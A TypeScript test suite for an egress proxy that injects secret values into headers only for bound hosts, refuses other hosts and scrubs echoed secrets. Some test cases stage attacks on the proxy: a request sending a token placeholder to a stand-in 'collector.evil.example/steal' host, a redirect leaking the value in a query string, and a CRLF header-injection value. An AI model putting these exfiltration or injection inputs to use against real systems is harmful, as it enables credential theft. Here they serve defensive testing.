import { Effect, Exit, Fiber, Layer, Stream } from "effect"
import { HttpBody, HttpClient, HttpClientRequest } from "effect/http"
import { describe, expect, test } from "vitest"
import { Egress } from "../src/index.ts"
import {
  API,
  audit,
  brokenBody,
  chunked,
  forwardThrough,
  httpClient,
  leaks,
  OTHER,
  OTHER_PLACEHOLDER,
  PLACEHOLDER,
  policy,
  scripted,
  STALE_PLACEHOLDER,
  telemetry,
  VALUE,
  vault
} from "./fixtures.ts"

const b64 = (text: string) => btoa(String.fromCharCode(...new TextEncoder().encode(text)))

const decide = (url: string, headers: Record<string, string> = {}, method = "GET") =>
  Egress.decide({ method, url, headers }, policy)

describe("Egress.decide", () => {
  test.each(
    [
      ["not a url", {}, "GET", "invalid_url", ""],
      ["ftp://api.example.com/file", {}, "GET", "invalid_url", ""],
      [`https://user:pw@${API}/`, {}, "GET", "invalid_url", API],
      [`https://${API}:8443/`, {}, "GET", "port_not_allowed", API],
      ["https://evil.example/", {}, "GET", "host_not_allowed", "evil.example"],
      ["https://evil.example/", { authorization: `Bearer ${PLACEHOLDER}` }, "GET", "host_not_allowed", "evil.example"],
      [
        "https://api.github.com/",
        { authorization: `Bearer ${PLACEHOLDER}` },
        "GET",
        "secret_not_allowed",
        "api.github.com"
      ],
      [`https://${API}/`, { "x-api-key": PLACEHOLDER }, "DELETE", "secret_not_allowed", API],
      [`https://${API}/`, { "x-api-key": STALE_PLACEHOLDER }, "GET", "unknown_placeholder", API],
      [`http://${API}/`, { "x-api-key": PLACEHOLDER }, "GET", "insecure_scheme", API],
      [
        "https://registry.npmjs.org/",
        { authorization: `Basic ${b64(`user:${PLACEHOLDER}`)}` },
        "GET",
        "secret_not_allowed",
        "registry.npmjs.org"
      ]
    ] as const
  )("%s %j %s is refused as %s", (url, headers, method, code, host) => {
    expect(decide(url, headers, method)).toMatchObject({ _tag: "Denied", host, code })
  })

  test("a refusal names the known secrets the request carried, whatever refused it", () => {
    const carrying = { authorization: `Bearer ${PLACEHOLDER}`, "x-other": `${OTHER_PLACEHOLDER},${STALE_PLACEHOLDER}` }
    expect(decide("not a url", carrying)).toMatchObject({ code: "invalid_url", secrets: ["API_KEY", "GH_TOKEN"] })
    expect(decide("https://evil.example/", carrying)).toMatchObject({
      code: "host_not_allowed",
      secrets: ["API_KEY", "GH_TOKEN"]
    })
    expect(decide("https://evil.example/")).toMatchObject({ code: "host_not_allowed", secrets: [] })
  })

  test("more than sixteen distinct placeholders are refused", () => {
    const many = Array.from({ length: 17 }, (_, i) => `smthrs-secret-${i.toString(16).padStart(64, "0")}`)
    expect(decide(`https://${API}/`, { "x-keys": many.join(",") })).toMatchObject({ code: "too_many_placeholders" })
  })

  test("an allowed host, or a secret's host, with no placeholder goes out using nothing", () => {
    expect(decide("https://registry.npmjs.org/pkg")).toEqual({ _tag: "Allowed", host: "registry.npmjs.org", used: [] })
    expect(decide(`https://${API}/v1`)).toEqual({ _tag: "Allowed", host: API, used: [] })
    expect(decide(`http://${API}/v1`)).toMatchObject({ _tag: "Allowed", used: [] })
  })

  test("a placeholder is found in any header value and in a decoded Basic credential", () => {
    expect(decide(`https://${API}/`, { authorization: `Basic ${b64(`t:${PLACEHOLDER}`)}` }, "POST")).toMatchObject({
      _tag: "Allowed",
      used: [policy.secrets[0]]
    })
    expect(decide(`https://${API}/`, { cookie: `a=1; key=${PLACEHOLDER}` })).toMatchObject({
      used: [policy.secrets[0]]
    })
  })

  test("a Basic credential that isn't base64 of UTF-8 is read as it is", () => {
    expect(decide(`https://${API}/`, { authorization: `Basic ${PLACEHOLDER}` })).toMatchObject({
      used: [policy.secrets[0]]
    })
    expect(decide(`https://${API}/`, { authorization: "Basic //79" })).toMatchObject({ used: [] })
  })

  test("headers that are never forwarded are never read for placeholders", () => {
    expect(
      decide(`https://${API}/`, {
        host: STALE_PLACEHOLDER,
        "proxy-authorization": STALE_PLACEHOLDER,
        connection: "x-hop",
        "x-hop": STALE_PLACEHOLDER
      })
    ).toMatchObject({ _tag: "Allowed", used: [] })
  })
})

describe("Egress.forward", () => {
  test("a placeholder in a header reaches its own host as the value, and only in that header", async () => {
    const upstream = scripted()
    const { response, body, entries } = await forwardThrough(
      new Request(`https://${API}/v1/charges?key=${PLACEHOLDER}`, {
        method: "POST",
        headers: {
          authorization: `Bearer ${PLACEHOLDER}`,
          "x-api-key": PLACEHOLDER,
          "content-type": "application/json",
          "accept-encoding": "gzip",
          range: "bytes=0-3",
          "if-range": "etag",
          connection: "keep-alive, x-hop",
          "x-hop": "dropped",
          "keep-alive": "timeout=5"
        },
        body: JSON.stringify({ key: PLACEHOLDER })
      }),
      { fetch: upstream.fetch }
    )
    expect(response.status).toBe(200)
    expect(body).toBe("ok")
    const [seen] = upstream.seen
    expect(seen!.headers.authorization).toBe(`Bearer ${VALUE}`)
    expect(seen!.headers["x-api-key"]).toBe(VALUE)
    // Never substituted outside headers: the URL and the body carry the placeholder.
    expect(seen!.url).toBe(`https://${API}/v1/charges?key=${PLACEHOLDER}`)
    expect(seen!.body).toBe(JSON.stringify({ key: PLACEHOLDER }))
    expect(seen!.redirect).toBe("manual")
    expect(seen!.headers["accept-encoding"]).toBe("identity")
    expect(seen!.headers).not.toHaveProperty("range")
    expect(seen!.headers).not.toHaveProperty("if-range")
    expect(seen!.headers).not.toHaveProperty("x-hop")
    expect(seen!.headers).not.toHaveProperty("keep-alive")
    expect(entries).toEqual([{ host: API, method: "POST", outcome: "forwarded", secrets: ["API_KEY"] }])
  })

  test("a Basic credential's placeholder is substituted inside the decoded credential", async () => {
    const upstream = scripted()
    await forwardThrough(
      new Request("https://api.github.com/repos", {
        headers: { authorization: `Basic ${b64(`x-access-token:${OTHER_PLACEHOLDER}`)}` }
      }),
      { fetch: upstream.fetch }
    )
    expect(upstream.seen[0]!.headers.authorization).toBe(`Basic ${b64(`x-access-token:${OTHER}`)}`)
  })

  test("a Basic credential that isn't base64 has its placeholder substituted as it stands", async () => {
    const upstream = scripted()
    await forwardThrough(new Request(`https://${API}/`, { headers: { authorization: `Basic ${PLACEHOLDER}` } }), {
      fetch: upstream.fetch
    })
    expect(upstream.seen[0]!.headers.authorization).toBe(`Basic ${VALUE}`)
  })

  test("a host no binding or allow list names gets nothing: refused before anything is sent", async () => {
    const upstream = scripted()
    const { response, body, entries, recorded } = await forwardThrough(
      new Request("https://collector.evil.example/steal", { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
      { fetch: upstream.fetch }
    )
    expect(response.status).toBe(403)
    expect(body).toBe("host_not_allowed")
    expect(upstream.seen).toEqual([])
    expect(entries).toEqual([
      { host: "collector.evil.example", method: "GET", outcome: "host_not_allowed", secrets: ["API_KEY"] }
    ])
    expect(recorded.count("host_not_allowed")).toBe(1)
  })

  test("a secret sent to another secret's host, or by a method it isn't bound to, is refused unsent", async () => {
    for (
      const request of [
        new Request("https://api.github.com/user", { headers: { authorization: `token ${PLACEHOLDER}` } }),
        new Request(`https://${API}/v1/charges/1`, { method: "DELETE", headers: { "x-api-key": PLACEHOLDER } })
      ]
    ) {
      const upstream = scripted()
      const { response, body } = await forwardThrough(request, { fetch: upstream.fetch })
      expect([response.status, body]).toEqual([403, "secret_not_allowed"])
      expect(upstream.seen).toEqual([])
    }
  })

  test("with no secrets, an allowed host gets the request as the guest sent it, with nothing revealed", async () => {
    const upstream = scripted(() => new Response("tarball", { headers: { "content-length": "7" } }))
    const { response, body, entries } = await forwardThrough(
      new Request("https://registry.npmjs.org/left-pad", { headers: { range: "bytes=0-3", "accept-encoding": "br" } }),
      { fetch: upstream.fetch, values: {}, policy: { secrets: [], allow: ["registry.npmjs.org"] } }
    )
    expect([response.status, body]).toEqual([200, "tarball"])
    expect(upstream.seen[0]!.headers.range).toBe("bytes=0-3")
    expect(upstream.seen[0]!.headers["accept-encoding"]).toBe("br")
    expect(response.headers.get("content-length")).toBeNull()
    expect(entries).toEqual([{ host: "registry.npmjs.org", method: "GET", outcome: "forwarded", secrets: [] }])
  })

  test("an allowed host that echoes a value sent to another host is scrubbed too, and can't ask for a slice", async () => {
    const upstream = scripted(() => new Response(`read back ${VALUE} and ${b64(OTHER)}`))
    const { body } = await forwardThrough(
      new Request("https://registry.npmjs.org/echo", { headers: { range: "bytes=0-3" } }),
      { fetch: upstream.fetch }
    )
    expect(leaks(body)).toEqual([])
    expect(body.startsWith(`read back ${PLACEHOLDER} and `)).toBe(true)
    expect(body).toContain(OTHER_PLACEHOLDER)
    expect(upstream.seen[0]!.headers).not.toHaveProperty("range")
  })

  test("a redirect goes back to the guest unfollowed, its Location scrubbed", async () => {
    const upstream = scripted(() =>
      new Response(null, {
        status: 302,
        headers: { location: `https://collector.evil.example/?k=${encodeURIComponent(VALUE)}` }
      })
    )
    const { response } = await forwardThrough(
      new Request(`https://${API}/login`, { headers: { "x-api-key": PLACEHOLDER } }),
      { fetch: upstream.fetch }
    )
    expect(response.status).toBe(302)
    expect(response.headers.get("location")).toBe(`https://collector.evil.example/?k=${PLACEHOLDER}`)
    expect(upstream.seen).toHaveLength(1)
    expect(upstream.seen[0]!.redirect).toBe("manual")
  })

  test("an answer that echoes a value, in any form, across chunks and headers, reaches the guest scrubbed", async () => {
    const echo = [
      VALUE,
      encodeURIComponent(VALUE),
      JSON.stringify(VALUE),
      b64(`user:${VALUE}`),
      OTHER,
      b64(OTHER)
    ].join("|")
    const bytes = new TextEncoder().encode(echo)
    const upstream = scripted(() =>
      new Response(
        chunked(Array.from({ length: Math.ceil(bytes.length / 7) }, (_, i) => bytes.slice(i * 7, i * 7 + 7))),
        {
          headers: {
            "set-cookie": `session=${VALUE}`,
            "x-echo": b64(`t:${VALUE}`),
            "content-encoding": "gzip",
            "content-length": "999"
          }
        }
      )
    )
    // GH_TOKEN isn't bound to this host, and the request didn't use it: its echoes are scrubbed all the same.
    const { response, body } = await forwardThrough(
      new Request(`https://${API}/echo`, { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
      { fetch: upstream.fetch }
    )
    expect(leaks(body)).toEqual([])
    expect(body).toContain(PLACEHOLDER)
    expect(body).toContain(OTHER_PLACEHOLDER)
    expect(leaks(JSON.stringify(Object.fromEntries(response.headers)))).toEqual([])
    expect(response.headers.get("content-encoding")).toBeNull()
    expect(response.headers.get("content-length")).toBeNull()
  })

  test("headers over 64 KiB once substituted are refused with 431, unsent", async () => {
    const long = "v".repeat(16 * 1024)
    const upstream = scripted()
    const headers = Object.fromEntries(Array.from({ length: 4 }, (_, i) => [`x-key-${i}`, PLACEHOLDER]))
    const { response, body, entries } = await forwardThrough(new Request(`https://${API}/`, { headers }), {
      fetch: upstream.fetch,
      values: { API_KEY: long, GH_TOKEN: OTHER }
    })
    expect([response.status, body]).toEqual([431, "headers_too_large"])
    expect(upstream.seen).toEqual([])
    expect(entries).toEqual([{ host: API, method: "GET", outcome: "headers_too_large", secrets: ["API_KEY"] }])
  })

  test.each([
    "value\r\nX-Injected: 1",
    "tokenévalue",
    "token😀value",
    " token-value",
    "token-value "
  ])("a stored value that cannot go in a header is never sent: %j", async (value) => {
    const upstream = scripted()
    const { response, body, entries, recorded } = await forwardThrough(
      new Request(`https://${API}/`, { headers: { "x-api-key": PLACEHOLDER } }),
      { fetch: upstream.fetch, values: { API_KEY: value, GH_TOKEN: OTHER } }
    )
    expect([response.status, body]).toEqual([503, "value"])
    expect(upstream.seen).toEqual([])
    expect(entries).toEqual([])
    expect(recorded.count("unavailable_value")).toBe(1)
    expect(leaks(recorded.recorded(), [value])).toEqual([])
  })

  test("a value the vault can't reveal fails closed: 503 and nothing sent", async () => {
    const upstream = scripted()
    const { response, body, recorded } = await forwardThrough(
      new Request(`https://${API}/`, { headers: { "x-api-key": PLACEHOLDER } }),
      { fetch: upstream.fetch, values: {} }
    )
    expect([response.status, body]).toEqual([503, "secret"])
    expect(upstream.seen).toEqual([])
    expect(recorded.count("unavailable_secret")).toBe(1)
  })

  test("a decision the audit can't record is not sent; a refusal stands either way", async () => {
    const upstream = scripted()
    const forwarded = await forwardThrough(
      new Request(`https://${API}/`, { headers: { "x-api-key": PLACEHOLDER } }),
      { fetch: upstream.fetch, auditDown: true }
    )
    expect([forwarded.response.status, forwarded.body]).toEqual([503, "audit"])
    const refused = await forwardThrough(new Request("https://evil.example/"), {
      fetch: upstream.fetch,
      auditDown: true
    })
    expect([refused.response.status, refused.body]).toEqual([403, "host_not_allowed"])
    expect(upstream.seen).toEqual([])
  })

  test("a host that doesn't answer is 502, and the failure carries nothing of the request", async () => {
    const upstream = scripted(() => "throw")
    const { response, body, recorded } = await forwardThrough(
      new Request(`https://${API}/`, { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
      { fetch: upstream.fetch }
    )
    expect([response.status, body]).toEqual([502, "upstream"])
    expect(upstream.seen).toHaveLength(1)
    expect(recorded.count("unavailable_upstream")).toBe(1)
    expect(leaks(recorded.recorded())).toEqual([])
  })

  test("HEAD and bodiless statuses answer with no body and settle telemetry once", async () => {
    for (const [method, status] of [["HEAD", 200], ["HEAD", 204], ["GET", 204], ["GET", 205], ["GET", 304]] as const) {
      const upstream = scripted(() => new Response(null, { status, headers: { etag: "x" } }))
      const { response, body, recorded } = await forwardThrough(
        new Request("https://registry.npmjs.org/p", { method }),
        {
          fetch: upstream.fetch
        }
      )
      expect([response.status, body, response.headers.get("etag")]).toEqual([status, "", "x"])
      expect(recorded.count("forwarded")).toBe(1)
      expect(recorded.count("broken")).toBe(0)
      expect(recorded.logs).toHaveLength(1)
      expect(recorded.logs[0]).toMatchObject({
        level: "Info",
        annotations: { outcome: "forwarded", host: "registry.npmjs.org", method, status, secrets: 0 }
      })
    }
  })

  test("telemetry carries the host, method, outcome and counts, and never a value in any form", async () => {
    const upstream = scripted((request) =>
      new Response(`echo ${request.headers.get("x-api-key")}`, {
        status: 401,
        headers: { "www-authenticate": `Bearer error=${VALUE}` }
      })
    )
    const { response, body, recorded } = await forwardThrough(
      new Request(`https://${API}/v1?token=x`, { headers: { "x-api-key": PLACEHOLDER } }),
      { fetch: upstream.fetch }
    )
    expect([response.status, body]).toEqual([401, `echo ${PLACEHOLDER}`])
    const span = recorded.spans.find((s) => s.name === "Egress.execute")!
    expect(Object.fromEntries(span.attributes)).toMatchObject({
      "server.address": API,
      "http.request.method": "GET",
      "smithers.egress.outcome": "forwarded",
      "http.response.status_code": 401
    })
    // The HTTP client's own span, which would record the request, is off.
    expect(recorded.spans.map((s) => s.name)).toEqual(["Egress.execute"])
    expect(recorded.count("forwarded")).toBe(1)
    expect(recorded.logs.at(-1)!.annotations).toMatchObject({ outcome: "forwarded", host: API, secrets: 1 })
    expect(leaks(recorded.recorded())).toEqual([])
  })

  test("an answer the host streams outside the request's services is still logged and counted by its caller", async () => {
    const upstream = scripted(() => new Response("ok"))
    const { response, body, recorded } = await forwardThrough(
      new Request(`https://${API}/v1`, { headers: { "x-api-key": PLACEHOLDER } }),
      { fetch: upstream.fetch, hostContext: false }
    )
    expect([response.status, body]).toEqual([200, "ok"])
    expect(recorded.count("forwarded")).toBe(1)
    expect(String(recorded.logs.at(-1)?.message)).toBe("secrets.egress")
    expect(recorded.logs.at(-1)!.annotations).toMatchObject({
      outcome: "forwarded",
      host: API,
      status: 200,
      secrets: 1
    })
  })

  test("an answer that breaks off counts as broken and fails with nothing of the answer", async () => {
    const upstream = scripted(() => new Response(brokenBody(`first ${VALUE}`)))
    const recorded = telemetry()
    const exit = await Effect.runPromiseExit(
      recorded.provide(
        Egress.execute(
          HttpClientRequest.get(`https://${API}/`, { headers: { "x-api-key": PLACEHOLDER } }),
          policy
        ).pipe(
          Effect.flatMap((answer) => Stream.runCollect(answer.body)),
          Effect.provide(Layer.mergeAll(httpClient(upstream.fetch), vault(), audit().layer))
        )
      )
    )
    expect(Exit.isFailure(exit)).toBe(true)
    expect(JSON.stringify(exit)).toContain("@smthrs/secrets/Egress/Broken")
    expect(leaks(JSON.stringify(exit))).toEqual([])
    expect(recorded.count("broken")).toBe(1)
    expect(recorded.count("cancelled")).toBe(0)
    expect(recorded.logs).toHaveLength(1)
    expect(recorded.logs[0]).toMatchObject({ level: "Warn", annotations: { outcome: "broken" } })
    expect(leaks(recorded.recorded())).toEqual([])
  })
})

describe("Egress.execute", () => {
  const run = <A, E>(
    effect: Effect.Effect<A, E, any>,
    fetch: typeof globalThis.fetch,
    values?: Record<string, string>
  ) =>
    Effect.runPromiseExit(
      effect.pipe(Effect.provide(Layer.mergeAll(httpClient(fetch), vault(values), audit().layer))) as Effect.Effect<
        A,
        E
      >
    )

  test("a flow step's request gets its value in the header and URL parameters kept as placeholders", async () => {
    const upstream = scripted(() => new Response(`you sent ${VALUE}`))
    const request = HttpClientRequest.post(`https://${API}/v1`).pipe(
      HttpClientRequest.setHeader("authorization", `Bearer ${PLACEHOLDER}`),
      HttpClientRequest.setUrlParam("q", PLACEHOLDER),
      HttpClientRequest.setBody(HttpBody.text(`body ${PLACEHOLDER}`))
    )
    const exit = await run(
      Effect.flatMap(
        Egress.execute(request, policy),
        (answer) => Effect.map(Stream.runCollect(Stream.decodeText(answer.body)), (parts) => [...parts].join(""))
      ),
      upstream.fetch
    )
    expect(exit).toEqual(Exit.succeed(`you sent ${PLACEHOLDER}`))
    expect(upstream.seen[0]!.headers.authorization).toBe(`Bearer ${VALUE}`)
    expect(upstream.seen[0]!.url).toBe(`https://${API}/v1?q=${PLACEHOLDER}`)
    expect(upstream.seen[0]!.body).toBe(`body ${PLACEHOLDER}`)
  })

  test.each([["HEAD", 200], ["HEAD", 204], ["GET", 204], ["GET", 205], ["GET", 304]] as const)(
    "%s %s settles before its body is read and is never counted twice",
    async (method, status) => {
      const upstream = scripted(() => new Response(null, { status }))
      const recorded = telemetry()
      const exit = await run(
        recorded.provide(Effect.gen(function*() {
          const answer = yield* Egress.execute(HttpClientRequest.make(method)("https://registry.npmjs.org/p"), policy)
          expect(answer.status).toBe(status)
          expect(recorded.count("forwarded")).toBe(1)
          expect(recorded.logs).toHaveLength(1)
          expect(recorded.logs[0]).toMatchObject({
            level: "Info",
            annotations: { outcome: "forwarded", method, status }
          })
          yield* Stream.runDrain(answer.body)
          yield* Stream.runDrain(answer.body)
        })),
        upstream.fetch
      )
      expect(Exit.isSuccess(exit)).toBe(true)
      expect(recorded.count("forwarded")).toBe(1)
      expect(recorded.logs).toHaveLength(1)
    }
  )

  test("a refusal is a typed failure with its code; nothing is sent", async () => {
    const upstream = scripted()
    const exit = await run(
      Effect.flip(Egress.execute(HttpClientRequest.get("https://evil.example/"), policy)),
      upstream.fetch
    )
    expect(exit).toEqual(Exit.succeed(new Egress.Refused({ code: "host_not_allowed" })))
    expect(upstream.seen).toEqual([])
  })

  test("a request whose URL doesn't parse is refused as invalid", async () => {
    const upstream = scripted()
    const exit = await run(Effect.flip(Egress.execute(HttpClientRequest.get("not a url"), policy)), upstream.fetch)
    expect(exit).toEqual(Exit.succeed(new Egress.Refused({ code: "invalid_url" })))
    expect(upstream.seen).toEqual([])
  })

  test("a body interrupted while it streams is interrupted, not broken", async () => {
    const stalled = new ReadableStream<Uint8Array>({ pull: () => new Promise(() => {}) })
    const upstream = scripted(() => new Response(stalled))
    const recorded = telemetry()
    const exit = await Effect.runPromise(
      recorded.provide(
        Effect.gen(function*() {
          const answer = yield* Egress.execute(HttpClientRequest.get(`https://${API}/`), policy)
          const fiber = yield* Effect.forkChild(Stream.runCollect(answer.body))
          yield* Effect.sleep(10)
          return yield* Fiber.interrupt(fiber).pipe(Effect.andThen(Fiber.await(fiber)))
        }).pipe(Effect.provide(Layer.mergeAll(httpClient(upstream.fetch), vault(), audit().layer)))
      )
    )
    expect(Exit.hasInterrupts(exit)).toBe(true)
    expect(recorded.count("cancelled")).toBe(1)
    expect(recorded.count("broken")).toBe(0)
    expect(recorded.count("forwarded")).toBe(0)
    expect(recorded.logs).toHaveLength(1)
    expect(recorded.logs[0]).toMatchObject({
      level: "Info",
      annotations: { outcome: "cancelled", host: API, status: 200 }
    })
    expect(leaks(recorded.recorded())).toEqual([])
  })

  test("a caller's own fetch options are kept, with redirects never followed", async () => {
    const upstream = scripted()
    const { FetchHttpClient } = await import("effect/http")
    const exit = await run(
      Egress.execute(HttpClientRequest.get("https://registry.npmjs.org/p"), policy).pipe(
        Effect.provideService(FetchHttpClient.RequestInit, { redirect: "follow", cache: "no-store" })
      ),
      async (input, init) => {
        expect(init?.redirect).toBe("manual")
        expect(init?.cache).toBe("no-store")
        return upstream.fetch(input, init)
      }
    )
    expect(Exit.isSuccess(exit)).toBe(true)
  })

  test("a vault or client that is itself interrupted interrupts the request; it never reads as unavailable", async () => {
    const interrupting = Layer.succeed(Egress.Vault, Egress.Vault.of({ reveal: () => Effect.interrupt }))
    const client = Layer.succeed(HttpClient.HttpClient, HttpClient.make(() => Effect.interrupt))
    for (
      const layer of [
        Layer.mergeAll(httpClient(scripted().fetch), interrupting, audit().layer),
        Layer.mergeAll(client, vault(), audit().layer)
      ]
    ) {
      const exit = await Effect.runPromiseExit(
        Egress.execute(HttpClientRequest.get(`https://${API}/`, { headers: { "x-api-key": PLACEHOLDER } }), policy)
          .pipe(Effect.provide(layer))
      )
      expect(Exit.hasInterrupts(exit)).toBe(true)
    }
  })

  test("interrupted while revealing or sending, it is interrupted, not unavailable", async () => {
    const never = () => new Promise<Response>(() => {})
    const stalled = Layer.succeed(Egress.Vault, Egress.Vault.of({ reveal: () => Effect.never }))
    for (
      const layer of [
        Layer.mergeAll(httpClient(scripted().fetch), stalled, audit().layer),
        Layer.mergeAll(httpClient(never), vault(), audit().layer)
      ]
    ) {
      const exit = await Effect.runPromise(
        Effect.gen(function*() {
          const fiber = yield* Effect.forkChild(
            Egress.execute(HttpClientRequest.get(`https://${API}/`, { headers: { "x-api-key": PLACEHOLDER } }), policy)
              .pipe(Effect.provide(layer))
          )
          yield* Effect.yieldNow
          yield* Effect.sleep(10)
          return yield* Fiber.interrupt(fiber).pipe(Effect.andThen(Fiber.await(fiber)))
        })
      )
      expect(Exit.hasInterrupts(exit)).toBe(true)
    }
  })
})
